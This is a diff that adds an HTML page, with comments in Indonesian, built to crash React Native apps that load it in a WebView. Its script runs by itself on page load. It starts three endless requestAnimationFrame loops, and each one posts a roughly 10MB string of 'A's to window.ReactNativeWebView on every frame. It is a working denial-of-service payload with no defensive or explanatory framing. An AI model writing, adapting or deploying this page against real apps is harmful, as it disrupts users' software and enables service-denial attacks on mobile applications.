@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>ReactNativeWebView Ultra Crash</title>
+<style>
+body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+</style>
+</head>
+<body>
+<h2>💥 Ultra Crash Mode</h2>
+<pre id="log"></pre>
+
+<script>
+const log = msg => document.getElementById("log").textContent += "\n" + msg;
+
+function post(msg) {
+    try {
+        if (window.ReactNativeWebView) {
+            window.ReactNativeWebView.postMessage(msg);
+        } else {
+            log("ReactNativeWebView not detected.");
+        }
+    } catch (e) {
+        log("Error: " + e.message);
+    }
+}
+
+function spamCrash() {
+    const payload = "A".repeat(10_000_000); // 10 juta karakter (~10MB)
+    log("💥 Multi-thread spam started...");
+
+    function loop() {
+        post(payload);
+        requestAnimationFrame(loop);
+    }
+
+    // Jalankan 3 spam loop paralel
+    loop();
+    loop();
+    loop();
+}
+
+// Auto start begitu halaman dibuka
+spamCrash();
+</script>
+</body>
+</html>
